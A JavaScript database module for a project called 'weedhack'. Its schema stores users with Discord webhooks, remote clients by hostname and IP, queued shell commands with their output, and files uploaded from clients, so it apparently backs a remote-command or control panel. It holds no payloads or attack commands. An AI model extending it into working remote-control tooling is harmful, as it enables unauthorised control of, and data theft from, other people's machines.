// language: JavaScript, file: db.js
// node:sqlite. single source of truth for schema and file layout.

import { DatabaseSync } from 'node:sqlite';
import fs from 'node:fs';
import path from 'node:path';
import 'dotenv/config';

export const DB_PATH   = process.env.DB_PATH   || './data/weedhack.db';
export const UPLOAD_DIR = process.env.UPLOAD_DIR || './data/uploads';

function ensureDir(p, mode = 0o700) {
  if (!fs.existsSync(p)) fs.mkdirSync(p, { recursive: true, mode });
}

ensureDir(path.dirname(DB_PATH));
ensureDir(UPLOAD_DIR);

const db = new DatabaseSync(DB_PATH);
db.exec('PRAGMA journal_mode = WAL');
db.exec('PRAGMA foreign_keys = ON');
db.exec('PRAGMA trusted_schema = OFF');
db.exec('PRAGMA synchronous = NORMAL');

db.exec(`
  CREATE TABLE IF NOT EXISTS users (
    id            INTEGER PRIMARY KEY AUTOINCREMENT,
    username      TEXT UNIQUE NOT NULL,
    email         TEXT UNIQUE NOT NULL,
    password_hash TEXT NOT NULL,
    account_key   TEXT UNIQUE NOT NULL,
    login_token   TEXT UNIQUE,
    discord_webhook TEXT NOT NULL,
    created_at    INTEGER NOT NULL
  );
  CREATE INDEX IF NOT EXISTS idx_users_key   ON users(account_key);
  CREATE INDEX IF NOT EXISTS idx_users_login ON users(login_token);

  CREATE TABLE IF NOT EXISTS clients (
    id         INTEGER PRIMARY KEY AUTOINCREMENT,
    user_id    INTEGER NOT NULL,
    key        TEXT NOT NULL,
    hostname   TEXT NOT NULL,
    ip         TEXT,
    last_seen  INTEGER NOT NULL,
    FOREIGN KEY (user_id) REFERENCES users(id) ON DELETE CASCADE
  );
  CREATE INDEX IF NOT EXISTS idx_clients_user   ON clients(user_id);
  CREATE INDEX IF NOT EXISTS idx_clients_host   ON clients(user_id, hostname);
  CREATE INDEX IF NOT EXISTS idx_clients_live   ON clients(user_id, last_seen);

  CREATE TABLE IF NOT EXISTS commands (
    id         INTEGER PRIMARY KEY AUTOINCREMENT,
    user_id    INTEGER NOT NULL,
    client_id  INTEGER NOT NULL,
    shell      TEXT NOT NULL,
    line       TEXT NOT NULL,
    output     TEXT,
    status     TEXT NOT NULL DEFAULT 'pending',
    created_at INTEGER NOT NULL,
    FOREIGN KEY (user_id)   REFERENCES users(id)   ON DELETE CASCADE,
    FOREIGN KEY (client_id) REFERENCES clients(id) ON DELETE CASCADE
  );
  CREATE INDEX IF NOT EXISTS idx_cmd_client ON commands(client_id, status);
  CREATE INDEX IF NOT EXISTS idx_cmd_user   ON commands(user_id, created_at);

  CREATE TABLE IF NOT EXISTS uploads (
    id          INTEGER PRIMARY KEY AUTOINCREMENT,
    user_id     INTEGER NOT NULL,
    client_id   INTEGER NOT NULL,
    filename    TEXT NOT NULL,
    stored_name TEXT UNIQUE NOT NULL,
    size        INTEGER NOT NULL,
    created_at  INTEGER NOT NULL,
    FOREIGN KEY (user_id)   REFERENCES users(id)   ON DELETE CASCADE,
    FOREIGN KEY (client_id) REFERENCES clients(id) ON DELETE CASCADE
  );
  CREATE INDEX IF NOT EXISTS idx_uploads_client ON uploads(client_id, created_at);
`);

// migration: add login_token to existing installs
try {
  const cols = db.prepare(`PRAGMA table_info(users)`).all();
  if (!cols.some(c => c.name === 'login_token')) {
    db.exec(`ALTER TABLE users ADD COLUMN login_token TEXT`);
    db.exec(`CREATE UNIQUE INDEX IF NOT EXISTS idx_users_login ON users(login_token)`);
    console.log('[db] migrated: added login_token column');
  }
} catch (e) {
  console.error('[db] migration check failed:', e.message);
}

for (const f of [DB_PATH, DB_PATH + '-wal', DB_PATH + '-shm']) {
  if (fs.existsSync(f)) { try { fs.chmodSync(f, 0o600); } catch {} }
}

export default db;